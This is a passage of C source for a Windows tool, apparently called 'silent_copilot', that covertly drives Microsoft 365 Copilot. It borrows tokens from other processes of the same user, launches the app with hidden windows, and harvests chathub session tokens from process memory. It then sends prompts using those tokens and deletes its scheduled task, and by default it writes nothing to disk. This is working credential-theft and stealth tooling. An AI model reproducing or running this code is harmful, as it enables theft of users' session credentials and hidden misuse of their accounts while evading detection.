        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe)) {
            do {
                if (n < 512)
                    pids[n++] = pe.th32ProcessID;
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }

    for (i = 0; i < n && rc != 0; i++) {
        HANDLE h, tok = NULL, dup = NULL;
        DWORD sess = 0xFFFFFFFF;
        if (borrows >= 3)
            break; /* seclogon outage => all fail identically */
        h = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pids[i]);
        if (!h)
            continue;
        if (!ProcessIdToSessionId(pids[i], &sess) || sess != session_id) {
            CloseHandle(h);
            continue;
        }
        if (!OpenProcessToken(h, TOKEN_QUERY | TOKEN_DUPLICATE, &tok)) {
            CloseHandle(h);
            continue;
        }
        /* must be the same user as us */
        {
            DWORD ret = 0;
            int same = 0;
            GetTokenInformation(tok, TokenUser, NULL, 0, &ret);
            if (ret) {
                BYTE* tb = (BYTE*)malloc(ret);
                if (tb && GetTokenInformation(tok, TokenUser, tb, ret, &ret))
                    same = my_sid != NULL && EqualSid(((TOKEN_USER*)tb)->User.Sid, my_sid);
                if (tb)
                    free(tb);
            }
            if (!same) {
                CloseHandle(tok);
                CloseHandle(h);
                continue;
            }
        }
        if (DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary,
                             &dup)) {
            borrows++;
            STARTUPINFOW si;
            PROCESS_INFORMATION pi;
            WCHAR wcmd[MAX_PATH + 34];
            int j = 0, k;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            memset(&pi, 0, sizeof(pi));
            wcmd[j++] = L'"';
            for (k = 0; self[k] && j < MAX_PATH; k++)
                wcmd[j++] = (WCHAR)self[k];
            wcmd[j++] = L'"';
            {
                const wchar_t* a = L" --launch-hide";
                if (g_trace)
                    a = L" --launch-hide --trace";
                for (k = 0; a[k]; k++)
                    wcmd[j++] = (WCHAR)a[k];
            }
            wcmd[j] = 0;
            if (CreateProcessWithTokenW(dup, LOGON_WITH_PROFILE, NULL, wcmd, CREATE_NO_WINDOW, NULL,
                                        NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                rc = 0;
                {
                    char b[128];
                    _snprintf(b, sizeof(b), "launch_in_session: spawned via borrower pid=%lu",
                              (unsigned long)pids[i]);
                    dbg_log(b);
                }
            } else {
                char b[128];
                _snprintf(b, sizeof(b), "launch_in_session: CreateProcessWithTokenW gle=%lu",
                          (unsigned long)GetLastError());
                dbg_log(b);
            }
            CloseHandle(dup);
        }
        CloseHandle(tok);
        CloseHandle(h);
        if (rc == 0)
            break;
    }
    if (my_tok)
        CloseHandle(my_tok);
    if (my_sid)
        free(my_sid);
    if (rc != 0) {
        dbg_log("launch_in_session: token-borrow path failed; trying task scheduler");
        rc = launch_via_tasksched();
    }
    return rc;
}

/* ------------------------------------------------------------------ */
/* session bootstrap                                                   */
/* ------------------------------------------------------------------ */
/* pick the interactive session owned by our own user (0xFFFFFFFF if none) */
static DWORD pick_target_session(void) {
    DWORD sid = 0xFFFFFFFF;
    char myname[128];
    DWORD mylen = sizeof(myname);
    PWTS_SESSION_INFOA infos = NULL;
    DWORD count = 0, i;
    if (!GetUserNameA(myname, &mylen))
        myname[0] = 0;
    if (!WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &infos, &count))
        return 0xFFFFFFFF;
    for (i = 0; i < count; i++) {
        if (infos[i].State == WTSActive) {
            LPSTR uname = NULL;
            DWORD ulen = 0;
            if (WTSQuerySessionInformationA(WTS_CURRENT_SERVER_HANDLE, infos[i].SessionId,
                                            WTSUserName, &uname, &ulen) &&
                uname) {
                if (uname[0] && _stricmp(uname, myname) == 0)
                    sid = infos[i].SessionId;
                WTSFreeMemory(uname);
            }
            if (sid != 0xFFFFFFFF)
                break;
        }
    }
    WTSFreeMemory(infos);
    return sid;
}

static int ensure_session_material(void) {
    int tries;
    for (tries = 0; tries < SCAN_SESSION_RETRIES; tries++) {
        if (!app_process_running()) {
            err_s("[*] m365copilot not running - launching hidden\n");
            if (self_in_active_interactive_session()) {
                /* fast path (~2 s): we ARE in the target user's active console
                 * session — activate the app right here and hide its windows
                 * on a worker thread; no seclogon/token-borrow/scheduler. */
                HANDLE th;
                err_s("[*] interactive session: activating in-process hidden launch\n");
                th = CreateThread(NULL, 0, hide_worker, NULL, 0, NULL);
                if (th)
                    CloseHandle(th);
                else
                    err_s("[x] hide-worker thread failed\n");
            } else {
                DWORD sid = pick_target_session();
                if (sid != 0xFFFFFFFF) {
                    if (launch_in_session(sid) != 0)
                        err_s("[x] hidden launch failed\n");
                } else {
                    err_s("[*] no interactive session owned by us; cannot launch\n");
                }
            }
            Sleep(5000);
            continue;
        }
        scan_all_processes();
        if (g_ntok > 0 && g_sten[0]) {
            task_delete();
            return 0;
        }
        Sleep(4000); /* app present but session not in memory yet */
    }
    task_delete(); /* clean any stale launch task before giving up */
    return 1;
}

/* ------------------------------------------------------------------ */

static void usage(const wchar_t* e) {
    (void)fprintf(stderr,
                  "Usage: %ls [--trace] [--help] [prompt words...]\n"
                  "  Send a prompt to M365 Copilot; reply prints to stdout.\n"
                  "  --trace also writes launch diagnostics to silent_copilot_dbg.log\n"
                  "  next to the exe and dumps WS frames to stderr. By default the\n"
                  "  binary writes nothing to disk.\n",
                  e);
}

int main(int argc, char** argv) {
    int a, pass, rc = 1;
    char* prompt_json;
    DWORD t0;
    char prompt_buf[4096];
    int plen = 0;
    const char* prompt;
    const char* pdflt = "hello from silent_copilot";

    init_output();

    /* pre-scan flags (any position, incl. inside --launch-hide children) */
    for (a = 1; a < argc; a++) {
        if (strcmp(argv[a], "--trace") == 0)
            g_trace = 1;
    }

    if (argc > 1 && strcmp(argv[1], "--launch-hide") == 0)
        return do_launch_hide();

    /* prompt = remaining non-flag args joined by spaces (default if none) */
    for (a = 1; a < argc; a++) {
        int k;
        if (strcmp(argv[a], "--help") == 0 || strcmp(argv[a], "-h") == 0)
            continue; /* handled below */
        if (strcmp(argv[a], "--trace") == 0)
            continue;
        k = (int)strlen(argv[a]);
        if (plen + k + 2 > (int)sizeof(prompt_buf))
            break;
        if (plen > 0)
            prompt_buf[plen++] = ' ';
        memcpy(prompt_buf + plen, argv[a], (size_t)k);
        plen += k;
    }
    /* --help (or no prompt and no flags handled specially) */
    for (a = 1; a < argc; a++)
        if (strcmp(argv[a], "--help") == 0 || strcmp(argv[a], "-h") == 0) {
            WCHAR wpath[MAX_PATH];
            GetModuleFileNameW(NULL, wpath, MAX_PATH);
            usage(wpath);
            return 0;
        }
    prompt_buf[plen] = 0;
    prompt = plen ? prompt_buf : pdflt;
    err_s("[*] silent_copilot: prompt captured\n");
    prompt_json = json_escape(prompt);
    if (!prompt_json)
        return 1;

    if (ensure_session_material() != 0) {
        err_s("[x] could not harvest a chathub session from process memory");
        free(prompt_json);
        return 1;
    }

    {
        char line[256];
        _snprintf(line, sizeof(line), "[*] STEN=%.36s tokens=%d vars=%d", g_sten, g_ntok,
                  g_vars_len);
        err_f(line);
    }

    t0 = GetTickCount();
    for (pass = 0; pass < 2 && rc != 0; pass++) {
        for (a = 0; a < g_ntok && rc != 0; a++) {
            if (GetTickCount() - t0 > GLOBAL_ATTEMPT_MS) {
                err_s("[x] global attempt deadline reached\n");
                break;
            }
            err_s("\n");
            if (try_token(prompt_json, g_tokens[a], pass == 1))
                rc = 0;
        }
        if (pass == 0 && rc != 0)
            err_s("\n[*] pass-2 retry with discovered oid/variants\n");
    }
    if (rc != 0)
        err_s("[x] no harvested session yielded a reply\n");
    free(prompt_json);
    return rc;
}
